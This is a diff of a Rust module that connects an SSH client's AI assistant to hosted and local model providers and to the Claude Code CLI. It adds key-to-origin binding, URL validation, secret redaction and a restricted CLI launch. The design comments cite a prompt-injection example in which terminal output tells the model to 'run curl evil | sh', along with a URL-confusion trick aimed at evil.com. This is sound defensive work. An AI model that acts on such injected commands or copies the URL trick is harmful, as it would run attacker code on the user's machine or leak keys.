@@ -1,31 +1,53 @@
 //! AI assistant provider client: Anthropic API and OpenAI-compatible endpoints
-//! (which covers OpenAI itself, Ollama, and LM Studio locally).
+//! (which covers OpenAI itself, Ollama, and LM Studio locally), plus the
+//! locally installed Claude Code CLI.
 //!
 //! # Trust model — read before changing anything here
 //!
 //! The assistant is an **advisor**. Nothing in this module, or reachable from
 //! it, executes a command: responses stream to the UI, the UI renders command
-//! suggestions as chips, clicking a chip TYPES the text into the terminal
-//! input **without a newline**, and only the human pressing Enter runs it.
-//! That final keystroke is the approval mechanism, deliberately physical.
+//! suggestions as chips, clicking a chip pastes the text into the terminal
+//! through the same guarded path as a user paste (bracketed paste, the
+//! destructive-command check, a confirm for multi-line text) **without a
+//! newline**, and only the human pressing Enter runs it. That final keystroke
+//! is the approval mechanism, deliberately physical.
 //!
 //! Why so strict: the model's context includes terminal output, and terminal
 //! output is attacker-influenced (a server MOTD, a log line, a filename can
 //! all say "run curl evil | sh"). Prompt injection with a shell attached is
 //! the threat; never letting the model complete an action is the defence.
 //!
-//! API keys live in Windows Credential Manager under `skiff:ai:<profile>`,
+//! The HTTP providers are text-only by nature. The Claude Code CLI is not: it
+//! is a full agent with file, shell and web tools, the user's hooks, MCP
+//! servers and permission allowlists. It is therefore launched as a pure text
+//! model (see `cli_args`): every built-in tool disabled, a strict empty MCP
+//! config, no settings sources (so no hooks or allow rules), no session
+//! persistence, in a fresh empty working directory. If the installed CLI does
+//! not offer those flags, the run is refused rather than started unrestricted.
+//! Managed (organisation) policy survives every flag, so the run is also
+//! refused when managed settings on disk define hooks or MCP servers; see
+//! "managed policy" below for what that check cannot see.
+//!
+//! API keys live in the OS credential vault under `hawser:ai:<profile>`,
 //! write-only from the UI like every other secret in this app.
 //!
-//! TLS uses the OS root store (rustls-tls-native-roots) so the corporate
-//! SSL-decryption CA deployed by GPO is honoured — the same reason the rest
-//! of this machine's tooling needed CA workarounds, solved here by trusting
-//! what Windows trusts.
+//! TLS uses the OS root store (rustls-tls-native-roots) so a corporate
+//! SSL-decryption CA deployed by policy is honoured.
+
+use std::collections::HashMap;
+use std::ffi::OsString;
+use std::path::{Path, PathBuf};
+use std::sync::{Mutex, OnceLock};
+use std::time::Duration;
 
 use futures_util::StreamExt;
+use reqwest::Url;
 use serde::{Deserialize, Serialize};
 use serde_json::json;
 use tauri::{AppHandle, Emitter};
+
+use super::vault_item;
+use tokio::sync::oneshot;
 
 use crate::credentials;
 
@@ -58,6 +80,8 @@ pub struct AiEvent {
     pub error: Option<String>,
 }
 
+const CLI_KIND: &str = "claude-code";
+
 const SYSTEM_PROMPT: &str = "You are a terse assistant embedded in an SSH client used by a \
 network/systems administrator. You see the tail of their live terminal session as context.\n\
 - Suggest concrete commands in fenced code blocks (```), one command per block, so the UI can \
@@ -73,127 +97,181 @@ fn vault_profile(profile: &str) -> String {
     format!("ai:{profile}")
 }
 
-// Backend-owned record of the origin (kind + base_url) each AI profile's key
-// may be sent to, in `ai_origins.json`. Written only at key-save time and at
-// startup migration — never through a frontend command — so a compromised
-// webview that rewrites the frontend-owned ai.json cannot redirect the key to
-// its own server. Mirrors the SSH credential→destination binding.
+/* ------------------------------------------------------------ key binding */
 
-fn ai_origins_path() -> Option<std::path::PathBuf> {
-    crate::utils::known_hosts::store_path()
-        .ok()?
-        .parent()
-        .map(|p| p.join("ai_origins.json"))
+// The origin (kind + base_url) each AI profile's key may be sent to is
+// backend-owned: a compromised webview that rewrites the frontend-owned
+// ai.json cannot redirect the key to its own server. It is held in two places
+// that must agree, like a host password's destinations (utils::hosts):
+// `ai_origins.json` (0600, atomic replace) holds `profile -> {kind, baseUrl}`,
+// and the key's own vault item holds the key plus `origin_digest`, SHA-256 of
+// that origin (utils::vault_item). The key is used only with an origin whose
+// digest matches the one stored with it; any disagreement fails closed and the
+// key is saved again. No earlier format is read: no Hawser build has been
+// released, so there is no plain-key, journal or backfill path.
+
+fn data_dir() -> Option<PathBuf> {
+    crate::utils::known_hosts::store_path().ok()?.parent().map(Path::to_path_buf)
 }
 
-fn load_ai_origins() -> serde_json::Value {
-    let Some(path) = ai_origins_path() else {
-        return json!({});
-    };
+const ORIGINS_FILE: &str = "ai_origins.json";
+
+/// The origins map. A missing file is an empty map; an unreadable or corrupt
+/// one is an error, so callers can fail closed instead of treating it as empty.
+fn load_ai_origins() -> Result<serde_json::Value, String> {
+    let path = data_dir().ok_or("no app data directory")?.join(ORIGINS_FILE);
     match std::fs::read_to_string(&path) {
-        Ok(t) => serde_json::from_str(&t).unwrap_or_else(|_| json!({})),
-        Err(_) => json!({}),
+        Ok(t) => match serde_json::from_str::<serde_json::Value>(&t) {
+            Ok(v) if v.is_object() => Ok(v),
+            _ => Err("ai_origins.json is corrupt".into()),
+        },
+        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(json!({})),
+        Err(e) => Err(e.to_string()),
     }
 }
 
 fn write_ai_origins(map: &serde_json::Value) -> Result<(), String> {
-    // Through the shared atomic writer (unique temp, serialised, never deletes
-    // the original before the replacement is in place).
-    crate::utils::hosts::save_named("ai_origins.json", map).map_err(|e| e.to_string())
+    // Through the shared atomic writer (unique temp, 0600, never deletes the
+    // original before the replacement is in place).
+    crate::utils::hosts::save_named(ORIGINS_FILE, map).map_err(|e| e.to_string())
 }
 
-/// Record, in backend-owned state, the origin this profile's key may be sent to.
-/// Errors propagate so key-save can be atomic (see `save_key`).
-pub fn snapshot_origin(profile: &str, kind: &str, base_url: &str) -> Result<(), String> {
-    let mut map = load_ai_origins();
-    if !map.is_object() {
-        map = json!({});
+/// Serialises every reader and writer of a key and its origin, so a chat's
+/// read never sees one half of a save.
+fn binding_lock() -> std::sync::MutexGuard<'static, ()> {
+    static LOCK: Mutex<()> = Mutex::new(());
+    LOCK.lock().unwrap_or_else(|e| e.into_inner())
+}
+
+/// Save a key together with the origin it may be sent to. Order: the origin
+/// file entry first, then the vault item with the matching digest; between
+/// the two, neither the old key nor the new origin is usable (fail closed).
+/// A failed vault write restores the previous origin, so the previous key
+/// keeps working.
+pub fn save_key(profile: &str, key: &str, kind: &str, base_url: &str) -> Result<(), String> {
+    let _binding = binding_lock();
+    save_key_with(&VaultKeys, profile, key, kind, base_url)
+}
+
+/// The vault and origin-file operations a key save and a chat's read need,
+/// behind a seam so they are testable.
+trait KeyStore {
+    fn read(&self, slot: &str) -> Result<zeroize::Zeroizing<String>, credentials::CredError>;
+    fn write(&self, slot: &str, item: &str) -> Result<(), credentials::CredError>;
+    fn delete(&self, slot: &str) -> Result<(), credentials::CredError>;
+    /// The recorded origin. `Err`: the file cannot be read (fail closed).
+    fn origin(&self, profile: &str) -> Result<Option<(String, String)>, String>;
+    /// Record (`Some`) or remove (`None`) the origin.
+    fn set_origin(&self, profile: &str, origin: Option<&(String, String)>) -> Result<(), String>;
+}
+
+struct VaultKeys;
+
+impl KeyStore for VaultKeys {
+    fn read(&self, slot: &str) -> Result<zeroize::Zeroizing<String>, credentials::CredError> {
+        credentials::read_secret(slot)
     }
-    if let Some(obj) = map.as_object_mut() {
-        obj.insert(profile.to_string(), json!({ "kind": kind, "baseUrl": base_url }));
+    fn write(&self, slot: &str, item: &str) -> Result<(), credentials::CredError> {
+        credentials::write_secret(slot, "api-key", item)
     }
-    write_ai_origins(&map)
-}
-
-/// The (kind, base_url) the key for `profile` is bound to, from backend-owned
-/// state — never the frontend-writable ai.json.
-fn saved_origin(profile: &str) -> Option<(String, String)> {
-    let map = load_ai_origins();
-    let o = map.get(profile)?;
-    let kind = o.get("kind").and_then(|v| v.as_str())?.to_string();
-    let base_url = o
-        .get("baseUrl")
-        .and_then(|v| v.as_str())
-        .unwrap_or("")
-        .to_string();
-    Some((kind, base_url))
-}
-
-/// Backfill: if a profile has a saved key but no backend origin yet, snapshot it
-/// from ai.json at STARTUP — before the webview can poison ai.json.
-pub fn migrate_ai_origins() {
-    // One "default" profile today; extend the list if profiles become plural.
-    for profile in ["default"] {
-        if !key_exists(profile) || saved_origin(profile).is_some() {
-            continue;
-        }
-        if let Ok(Some(cfg)) = crate::utils::hosts::load_named("ai.json") {
-            let kind = cfg.get("kind").and_then(|v| v.as_str()).unwrap_or("");
-            let base_url = cfg.get("baseUrl").and_then(|v| v.as_str()).unwrap_or("");
-            if !kind.is_empty() {
-                // Best-effort backfill: on failure the key simply stays unbound
-                // and chat fails closed until the key is re-saved — safe.
-                let _ = snapshot_origin(profile, kind, base_url);
+    fn delete(&self, slot: &str) -> Result<(), credentials::CredError> {
+        credentials::delete_secret(slot)
+    }
+    fn origin(&self, profile: &str) -> Result<Option<(String, String)>, String> {
+        let map = load_ai_origins()?;
+        let Some(o) = map.get(profile) else { return Ok(None) };
+        let kind = o.get("kind").and_then(|v| v.as_str()).ok_or("ai_origins.json is corrupt")?;
+        let base_url = o.get("baseUrl").and_then(|v| v.as_str()).ok_or("ai_origins.json is corrupt")?;
+        Ok(Some((kind.to_string(), base_url.to_string())))
+    }
+    fn set_origin(&self, profile: &str, origin: Option<&(String, String)>) -> Result<(), String> {
+        let mut map = match load_ai_origins() {
+            Ok(m) => m,
+            // Nothing to remove from a file that authorizes nothing.
+            Err(_) if origin.is_none() => return Ok(()),
+            // Replaced, not merged into: whatever it held fails closed.
+            Err(_) => json!({}),
+        };
+        if let Some(obj) = map.as_object_mut() {
+            match origin {
+                Some((kind, base_url)) => {
+                    obj.insert(profile.to_string(), json!({ "kind": kind, "baseUrl": base_url }));
+                }
+                None => {
+                    if obj.remove(profile).is_none() {
+                        return Ok(());
+                    }
+                }
             }
         }
+        write_ai_origins(&map)
     }
 }
 
-/// True if the URL targets loopback, so plain HTTP is acceptable (local Ollama
-/// / LM Studio). Parses the host out of the authority rather than a loose
-/// substring, so `http://localhost.evil.com` does NOT qualify.
-fn is_loopback_url(url: &str) -> bool {
-    let after = url.split("://").nth(1).unwrap_or(url);
-    let authority = after.split(['/', '?', '#']).next().unwrap_or("");
-    // Drop any userinfo@ prefix.
-    let hostport = authority.rsplit('@').next().unwrap_or(authority);
-    // Bracketed IPv6 (`[::1]:port`) vs host:port.
-    let host = if let Some(rest) = hostport.strip_prefix('[') {
-        rest.split(']').next().unwrap_or(rest)
-    } else {
-        hostport.split(':').next().unwrap_or(hostport)
-    };
-    let host = host.to_ascii_lowercase();
-    host == "localhost" || host == "127.0.0.1" || host == "::1" || host.ends_with(".localhost")
-}
-
-pub fn save_key(profile: &str, key: &str, kind: &str, base_url: &str) -> Result<(), String> {
-    credentials::write_secret(&vault_profile(profile), "api-key", key).map_err(|e| e.to_string())?;
-    // Bind the key to the origin at save time (human present), in backend-owned
-    // state, so a later poisoned ai.json cannot redirect it. Propagated so the
-    // save is atomic: if the origin cannot be persisted, the save fails rather
-    // than leaving a key that chat would then refuse to use.
-    snapshot_origin(profile, kind, base_url)?;
+fn save_key_with(store: &impl KeyStore, profile: &str, key: &str, kind: &str, base_url: &str) -> Result<(), String> {
+    let origin = (kind.to_string(), base_url.to_string());
+    // Encoded before anything is written, so a refusal changes nothing.
+    let item = vault_item::encode(&vault_item::Envelope {
+        user: "api-key".into(),
+        secret: zeroize::Zeroizing::new(key.to_string()),
+        dest_digest: None,
+        origin_digest: Some(vault_item::origin_digest(profile, &origin)),
+    })?;
+    let previous = store.origin(profile).ok().flatten();
+    store
+        .set_origin(profile, Some(&origin))
+        .map_err(|e| format!("could not record where the AI key may be sent: {e}"))?;
+    if let Err(e) = store.write(&vault_profile(profile), &item) {
+        // Best effort: if this fails too, the old key's digest does not match
+        // and it fails closed.
+        let _ = store.set_origin(profile, previous.as_ref());
+        return Err(e.to_string());
+    }
     Ok(())
 }
+
+/// The key for `profile` and the origin it may be sent to. `(None, None)`
+/// when no key can be read. A key whose item this build cannot read, or whose
+/// recorded origin does not match the digest stored with it, is an error: it
+/// is never sent anywhere.
+fn read_key(
+    store: &impl KeyStore,
+    profile: &str,
+) -> Result<(Option<zeroize::Zeroizing<String>>, Option<(String, String)>), String> {
+    let Ok(raw) = store.read(&vault_profile(profile)) else {
+        return Ok((None, None));
+    };
+    let env = vault_item::decode(raw).map_err(|e| format!("{DAMAGED_KEY} ({e})"))?;
+    let Some(stored) = env.origin_digest.as_deref() else {
+        return Err(DAMAGED_KEY.into());
+    };
+    match store.origin(profile) {
+        Ok(Some(origin)) if vault_item::origin_digest(profile, &origin) == stored => Ok((Some(env.secret), Some(origin))),
+        _ => Err(DAMAGED_KEY.into()),
+    }
+}
+
+const DAMAGED_KEY: &str =
+    "The saved AI key could not be used, because where it may be sent could not be confirmed. Save it again (or remove it) in the AI panel settings";
 
 pub fn key_exists(profile: &str) -> bool {
     credentials::has_secret(&vault_profile(profile))
 }
 
-/// Remove a profile's key and its origin binding. A missing key is not an
-/// error — the end state the user asked for already holds.
+/// Remove a profile's key and then its origin record. A missing key is not
+/// an error — the end state the user asked for already holds.
 pub fn delete_key(profile: &str) -> Result<(), String> {
-    match credentials::delete_secret(&vault_profile(profile)) {
+    let _binding = binding_lock();
+    delete_key_with(&VaultKeys, profile)
+}
+
+fn delete_key_with(store: &impl KeyStore, profile: &str) -> Result<(), String> {
+    match store.delete(&vault_profile(profile)) {
         Ok(()) | Err(credentials::CredError::NotFound(_)) => {}
         Err(e) => return Err(e.to_string()),
     }
-    let mut map = load_ai_origins();
-    if let Some(obj) = map.as_object_mut() {
-        if obj.remove(profile).is_some() {
-            write_ai_origins(&map)?;
-        }
-    }
+    // Without the key the record authorizes nothing; a failure is harmless.
+    let _ = store.set_origin(profile, None);
     Ok(())
 }
 
@@ -203,8 +281,236 @@ fn same_origin(kind_a: &str, url_a: &str, kind_b: &str, url_b: &str) -> bool {
     kind_a == kind_b && url_a.trim_end_matches('/') == url_b.trim_end_matches('/')
 }
 
-/// Stream one chat completion, emitting deltas on `ai://{run_id}`.
-pub async fn chat(
+/* ------------------------------------------------------------- endpoints */
+
+/// Parse and validate a provider base URL ONCE; the request is then built
+/// from this parsed value, so the loopback/HTTPS checks and the HTTP client can
+/// never disagree about the destination. Splitting the string by hand did:
+/// `http://evil.com\@localhost` looked like localhost to the check while the
+/// URL parser (backslash = path separator) sent it to evil.com.
+fn parse_base_url(raw: &str) -> Result<Url, String> {
+    let raw = raw.trim();
+    if raw.contains('\\') {
+        return Err("The provider URL must not contain a backslash.".into());
+    }
+    let url = Url::parse(raw).map_err(|e| format!("Invalid provider URL ({e})."))?;
+    if !matches!(url.scheme(), "http" | "https") {
+        return Err("The provider URL must start with https:// (or http:// for a local endpoint).".into());
+    }
+    if !url.username().is_empty() || url.password().is_some() {
+        return Err("The provider URL must not contain a user name or password.".into());
+    }
+    if url.host_str().is_none_or(str::is_empty) {
+        return Err("The provider URL has no host.".into());
+    }
+    if url.query().is_some() || url.fragment().is_some() {
+        return Err("The provider URL must not contain a query or fragment.".into());
+    }
+    Ok(url)
+}
+
+/// True if the parsed URL targets this machine, so plain HTTP is acceptable
+/// (local Ollama / LM Studio). Only the literal name `localhost` and loopback
+/// IPs count: `*.localhost` is resolved by DNS on some systems, so it is not
+/// trusted to stay on this machine.
+fn is_loopback(url: &Url) -> bool {
+    let Some(host) = url.host_str() else { return false };
+    let host = host.trim_start_matches('[').trim_end_matches(']');
+    host.eq_ignore_ascii_case("localhost")
+        || host.parse::<std::net::IpAddr>().map(|ip| ip.is_loopback()).unwrap_or(false)
+}
+
+/// `base` with `suffix` appended to its path.
+fn endpoint_url(base: &Url, suffix: &str) -> Url {
+    let mut u = base.clone();
+    let path = format!("{}/{suffix}", base.path().trim_end_matches('/'));
+    u.set_path(&path);
+    u
+}
+
+/// HTTP client for one provider request. Never follows redirects (a 3xx could
+/// bounce the key and the session context to an arbitrary host, defeating the
+/// origin checks). For a loopback destination it also ignores proxy settings:
+/// reqwest honours `HTTP_PROXY`/`ALL_PROXY` by default, and with no loopback
+/// exclusion a "local" Ollama request, context and any Authorization header
+/// included, would travel in cleartext to that proxy.
+fn http_client(url: &Url) -> Result<reqwest::Client, String> {
+    let mut b = reqwest::Client::builder()
+        .redirect(reqwest::redirect::Policy::none())
+        .connect_timeout(CONNECT_TIMEOUT);
+    if is_loopback(url) {
+        b = b.no_proxy();
+    }
+    b.build().map_err(|e| e.to_string())
+}
+
+/// Keys shorter than this cannot be scrubbed reliably (a two-character key
+/// matches all over ordinary text, and a partial echo is indistinguishable
+/// from prose), so errors are not shown verbatim at all with such a key.
+const MIN_SCRUBBABLE_KEY: usize = 8;
+/// Longest provider-error excerpt shown to the user, in characters.
+const MAX_ERROR_CHARS: usize = 400;
+
+/// Whether `c` can be part of an opaque token (API key, JWT segment, bearer).
+fn token_char(c: char) -> bool {
+    c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '+' | '/' | '=')
+}
+
+/// Replace every token-like run (20+ token characters mixing letters and
+/// digits) with `[redacted]`. Catches credentials this app does not know:
+/// another provider's key in an inherited environment, a bearer echoed by a
+/// proxy, a session token in a CLI diagnostic.
+fn redact_tokens(s: &str) -> String {
+    let mut out = String::with_capacity(s.len());
+    let mut run = String::new();
+    let flush = |run: &mut String, out: &mut String| {
+        let letters = run.chars().any(|c| c.is_ascii_alphabetic());
+        let digits = run.chars().any(|c| c.is_ascii_digit());
+        if run.chars().count() >= 20 && letters && digits {
+            out.push_str("[redacted]");
+        } else {
+            out.push_str(run);
+        }
+        run.clear();
+    };
+    for c in s.chars() {
+        if token_char(c) {
+            run.push(c);
+        } else {
+            flush(&mut run, &mut out);
+            out.push(c);
+        }
+    }
+    flush(&mut run, &mut out);
+    out
+}
+
+/// Remove the active key from provider-controlled text: the whole key
+/// wherever it appears, and a trailing fragment of it (4+ characters) where
+/// the text was already cut short by a capped read.
+fn scrub(msg: &str, key: &str) -> String {
+    let mut out = msg.replace(key, "[redacted]");
+    let max = key.len().min(out.len());
+    for n in (4..=max).rev() {
+        if key.is_char_boundary(n) && out.ends_with(&key[..n]) {
+            out.truncate(out.len() - n);
+            out.push_str("[redacted]");
+            break;
+        }
+    }
+    out
+}
+
+/// The first `max` characters of `s`, never splitting one.
+fn truncate_chars(s: &str, max: usize) -> String {
+    match s.char_indices().nth(max) {
+        Some((i, _)) => format!("{}…", &s[..i]),
+        None => s.to_string(),
+    }
+}
+
+/// What a provider error may show the user. Order matters: scrub the key and
+/// token-like strings out of the FULL text, strip control characters, and
+/// only then truncate, so a cut can never preserve half a secret. With a key
+/// too short to scrub reliably, the text is not shown at all.
+fn sanitize_error(msg: &str, key: Option<&str>) -> String {
+    let key = key.map(str::trim).filter(|k| !k.is_empty());
+    if let Some(k) = key {
+        if k.chars().count() < MIN_SCRUBBABLE_KEY {
+            return "The provider returned an error. Details are hidden because the saved API key is too short to be removed from them reliably; check the key in AI settings.".into();
+        }
+    }
+    let scrubbed = match key {
+        Some(k) => scrub(msg, k),
+        None => msg.to_string(),
+    };
+    let clean: String = redact_tokens(&scrubbed)
+        .chars()
+        .map(|c| if c.is_control() && c != '\n' { ' ' } else { c })
+        .collect();
+    truncate_chars(clean.trim(), MAX_ERROR_CHARS)
+}
+
+/* ------------------------------------------------------------- lifecycle */
+
+/// Whole-run budget for an HTTP provider (connect, headers, every byte).
+const HTTP_TIMEOUT: Duration = Duration::from_secs(600);
+/// Whole-run budget for the CLI (resolution, start, prompt, answer).
+const CLI_TIMEOUT: Duration = Duration::from_secs(180);
+const CONNECT_TIMEOUT: Duration = Duration::from_secs(15);
+/// Time allowed for the response headers once the request is sent.
+const HEADERS_TIMEOUT: Duration = Duration::from_secs(60);
+/// Time allowed to read the start of an error body.
+const ERROR_BODY_TIMEOUT: Duration = Duration::from_secs(10);
+/// Longest gap between streamed chunks.
+const IDLE_TIMEOUT: Duration = Duration::from_secs(60);
+
+/// Runs in flight and Stops that arrived first, by run id.
+///
+/// The webview picks the run id and can send `ai_cancel` while its `ai_chat`
+/// is still on its way; the two IPC commands are not ordered. A cancel for a
+/// run that is not registered yet is remembered, and `register` then reports
+/// the run as already cancelled, so a Stop is never lost to that race.
+#[derive(Default)]
+struct RunTable {
+    live: HashMap<String, oneshot::Sender<()>>,
+    /// Cancels seen before their run registered, oldest first. Bounded: a
+    /// cancel for a run that already finished also lands here and is never
+    /// consumed.
+    early: std::collections::VecDeque<String>,
+}
+
+/// Most remembered early cancels.
+const MAX_EARLY_CANCELS: usize = 64;
+
+impl RunTable {
+    /// Register a run's cancel handle. None if a Stop for it already arrived.
+    fn register(&mut self, run_id: &str) -> Option<oneshot::Receiver<()>> {
+        if let Some(i) = self.early.iter().position(|r| r == run_id) {
+            self.early.remove(i);
+            return None;
+        }
+        let (tx, rx) = oneshot::channel();
+        self.live.insert(run_id.to_string(), tx);
+        Some(rx)
+    }
+
+    /// Cancel a run; true if it was running. A run not registered yet is
+    /// cancelled as soon as it registers.
+    fn cancel(&mut self, run_id: &str) -> bool {
+        match self.live.remove(run_id) {
+            Some(tx) => tx.send(()).is_ok(),
+            None => {
+                if !self.early.iter().any(|r| r == run_id) {
+                    if self.early.len() >= MAX_EARLY_CANCELS {
+                        self.early.pop_front();
+                    }
+                    self.early.push_back(run_id.to_string());
+                }
+                false
+            }
+        }
+    }
+
+    fn finish(&mut self, run_id: &str) {
+        self.live.remove(run_id);
+    }
+}
+
+fn runs() -> std::sync::MutexGuard<'static, RunTable> {
+    static RUNS: OnceLock<Mutex<RunTable>> = OnceLock::new();
+    RUNS.get_or_init(Default::default).lock().unwrap_or_else(|e| e.into_inner())
+}
+
+/// Start one chat completion in the background. Deltas, and exactly one final
+/// `done` event (with `error` set on failure, timeout or cancel), arrive on
+/// `ai://{run_id}`. Every path ends in that final event, so the panel's
+/// composer can never stay locked.
+///
+/// The cancel handle is registered before any work starts (no key read, no
+/// request, no CLI spawn), and a Stop that arrived even earlier ends the run
+/// here without starting it.
+pub fn start(
     app: AppHandle,
     run_id: String,
     cfg: ProviderConfig,
@@ -212,178 +518,141 @@ pub async fn chat(
     system_context: String,
     messages: Vec<ChatMessage>,
 ) {
+    let Some(cancel_rx) = runs().register(&run_id) else {
+        let _ = app.emit(
+            &format!("ai://{run_id}"),
+            AiEvent { run_id: run_id.clone(), delta: String::new(), done: true, error: Some("Cancelled.".into()) },
+        );
+        return;
+    };
+    tokio::spawn(async move {
+        let budget = if cfg.kind == CLI_KIND { CLI_TIMEOUT } else { HTTP_TIMEOUT };
+        let work = run(&app, &run_id, cfg, &profile, &system_context, messages);
+        // Dropping `work` on timeout or cancel drops the HTTP request or the
+        // CLI child (kill_on_drop), so nothing keeps running unseen. Biased to
+        // the cancel, so a Stop already sent wins over work that is ready.
+        let outcome = tokio::select! {
+            biased;
+            _ = cancel_rx => Err("Cancelled.".into()),
+            r = tokio::time::timeout(budget, work) => match r {
+                Ok(r) => r,
+                Err(_) => Err(format!("No answer within {}s; the request was stopped.", budget.as_secs())),
+            },
+        };
+        runs().finish(&run_id);
+        let _ = app.emit(
+            &format!("ai://{run_id}"),
+            AiEvent { run_id: run_id.clone(), delta: String::new(), done: true, error: outcome.err() },
+        );
+    });
+}
+
+/// Stop a run started by `start`. False if it is not running (finished, or
+/// not started yet, in which case it is cancelled when it starts).
+pub fn cancel(run_id: &str) -> bool {
+    runs().cancel(run_id)
+}
+
+async fn run(
+    app: &AppHandle,
+    run_id: &str,
+    cfg: ProviderConfig,
+    profile: &str,
+    system_context: &str,
+    messages: Vec<ChatMessage>,
+) -> Result<(), String> {
     let topic = format!("ai://{run_id}");
-    let emit_err = |app: &AppHandle, msg: String| {
+    let emit = |delta: String| {
         let _ = app.emit(
             &topic,
-            AiEvent { run_id: run_id.clone(), delta: String::new(), done: true, error: Some(msg) },
+            AiEvent { run_id: run_id.to_string(), delta, done: false, error: None },
         );
     };
+    if cfg.kind == CLI_KIND {
+        return run_cli(&emit, cli_prompt(system_context, &messages)).await;
+    }
+    // Key and origin come from ONE vault item (see save_key), so they always
+    // belong together. On the blocking pool: a keychain read can show a
+    // prompt, and the lock can wait on a save's.
+    let prof = profile.to_string();
+    let (key, origin) = tokio::task::spawn_blocking(move || {
+        let _binding = binding_lock();
+        read_key(&VaultKeys, &prof)
+    })
+    .await
+    .map_err(|e| format!("could not read the AI key: {e}"))??;
+    let scrub_with = key.clone();
+    run_http(&emit, cfg, system_context, messages, key, origin)
+        .await
+        .map_err(|e| sanitize_error(&e, scrub_with.as_ref().map(|k| k.as_str())))
+}
+
+/* ------------------------------------------------------------------ http */
+
+async fn run_http(
+    emit: &(dyn Fn(String) + Sync),
+    cfg: ProviderConfig,
+    system_context: &str,
+    messages: Vec<ChatMessage>,
+    key: Option<zeroize::Zeroizing<String>>,
+    // The origin the key is bound to, read together with the key.
+    origin: Option<(String, String)>,
+) -> Result<(), String> {
+    let caller_url = parse_base_url(&cfg.base_url)?;
+    let caller_loopback = is_loopback(&caller_url);
 
     // Local endpoints (Ollama, LM Studio) usually need no key; only fail on a
     // missing key for the hosted providers where a request without one is
     // guaranteed to bounce anyway.
-    let key = credentials::read_secret(&vault_profile(&profile)).ok();
-    let needs_key = cfg.kind != "claude-code" && !is_loopback_url(&cfg.base_url);
-    if key.is_none() && needs_key {
-        emit_err(&app, "No API key saved for this provider. Add one in the AI panel settings.".into());
-        return;
-    }
-
-    // Claude Code CLI: a local process, not an HTTP endpoint. The prompt goes
-    // in over STDIN — never argv — so no shell-quoting surface exists no
-    // matter what the transcript contains. `cmd /C` resolves the npm shim
-    // (claude.cmd) that CreateProcess alone cannot.
-    if cfg.kind == "claude-code" {
-        let mut prompt = format!("{SYSTEM_PROMPT}
-
-{system_context}
-
-");
-        for m in &messages {
-            let who = if m.role == "user" { "User" } else { "Assistant" };
-            prompt.push_str(&format!("{who}: {}
-
-", m.content));
-        }
-        prompt.push_str("Assistant:");
-
-        // Launch the Claude CLI natively per platform: `cmd /C claude ...` on
-        // Windows (so PATH/.cmd shim resolution works and no console flashes),
-        // and `claude ...` directly on macOS/Linux (there is no `cmd`).
-        #[cfg(windows)]
-        let mut cmd = {
-            let mut c = tokio::process::Command::new("cmd");
-            c.args(["/C", "claude", "-p", "--output-format", "text"]);
-            c
-        };
-        #[cfg(not(windows))]
-        let mut cmd = {
-            let mut c = tokio::process::Command::new("claude");
-            c.args(["-p", "--output-format", "text"]);
-            c
-        };
-        cmd.stdin(std::process::Stdio::piped())
-            .stdout(std::process::Stdio::piped())
-            .stderr(std::process::Stdio::piped())
-            // A hung CLI is killed when the timeout below drops it, instead of
-            // lingering as an orphan.
-            .kill_on_drop(true);
-        #[cfg(windows)]
-        {
-            use std::os::windows::process::CommandExt;
-            cmd.creation_flags(0x0800_0000); // CREATE_NO_WINDOW
-        }
-
-        let mut child = match cmd.spawn() {
-            Ok(c) => c,
-            Err(e) => {
-                return emit_err(
-                    &app,
-                    format!("could not start the Claude Code CLI (`claude`): {e}. Is Claude Code installed and on PATH?"),
-                )
-            }
-        };
-        if let Some(mut stdin) = child.stdin.take() {
-            use tokio::io::AsyncWriteExt;
-            let _ = stdin.write_all(prompt.as_bytes()).await;
-            // Dropping stdin closes it; claude -p reads to EOF then answers.
-        }
-        // Bounded like the HTTP path: without it a wedged `claude` process never
-        // sends `done`, and the panel stays "streaming" with input refused.
-        const CLI_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(180);
-        let waited = match tokio::time::timeout(CLI_TIMEOUT, child.wait_with_output()).await {
-            Ok(r) => r,
-            Err(_) => {
-                return emit_err(
-                    &app,
-                    format!("Claude CLI timed out after {}s", CLI_TIMEOUT.as_secs()),
-                )
-            }
-        };
-        match waited {
-            Ok(out) if out.status.success() => {
-                let text = String::from_utf8_lossy(&out.stdout).trim().to_string();
-                let _ = app.emit(
-                    &topic,
-                    AiEvent { run_id: run_id.clone(), delta: text, done: false, error: None },
-                );
-                let _ = app.emit(
-                    &topic,
-                    AiEvent { run_id, delta: String::new(), done: true, error: None },
-                );
-            }
-            Ok(out) => {
-                let err = String::from_utf8_lossy(&out.stderr);
-                let err = err.trim();
-                // The most common failure is an unauthenticated CLI, which often
-                // exits non-zero with little or no stderr. Give the actual fix
-                // rather than a bare "exited 1".
-                let looks_unauthed = err.is_empty()
-                    || err.to_lowercase().contains("login")
-                    || err.to_lowercase().contains("auth")
-                    || err.to_lowercase().contains("not logged");
-                let msg = if looks_unauthed {
-                    format!(
-                        "Claude CLI exited {}. It may not be logged in — run `claude` in a terminal once to authenticate, then retry.{}",
-                        out.status,
-                        if err.is_empty() { String::new() } else { format!(" (details: {})", err.chars().take(200).collect::<String>()) }
-                    )
-                } else {
-                    format!("claude CLI exited {}: {}", out.status, err.chars().take(300).collect::<String>())
-                };
-                emit_err(&app, msg);
-            }
-            Err(e) => emit_err(&app, format!("claude CLI failed: {e}")),
-        }
-        return;
+    if key.is_none() && !caller_loopback {
+        return Err("No API key saved for this provider. Add one in the AI panel settings.".into());
     }
 
     // Bind the API key to the ORIGIN the user saved for this profile rather
     // than the base_url the caller passed: a compromised frontend could
     // otherwise point this profile at its own server in the same call that
-    // names the key, and be handed the key. Only relevant when a key will be
-    // attached (hosted providers); a keyless/loopback call keeps what was
-    // passed. The HTTPS check below then runs against the SAVED origin.
+    // names the key, and be handed the key. The HTTPS check below then runs
+    // against the SAVED origin.
     //
     // Fail CLOSED: if a key will be attached but there is no clean backend
     // origin for this profile, refuse rather than fall back to the caller's
-    // base_url — otherwise a poisoned/absent origin record would let the key be
-    // sent to a frontend-chosen destination.
+    // base_url.
     //
     // And never silently REDIRECT: if the user picked a different provider than
-    // the one the key is bound to (e.g. switched to local Ollama and left the
-    // key field blank), sending their terminal context to the old hosted origin
-    // instead would override an explicit privacy choice. A loopback selection
-    // goes ahead WITHOUT the key; anything else asks for the key to be re-saved.
-    let caller_loopback = is_loopback_url(&cfg.base_url);
-    let (cfg, key) = match key {
-        None => (cfg, None),
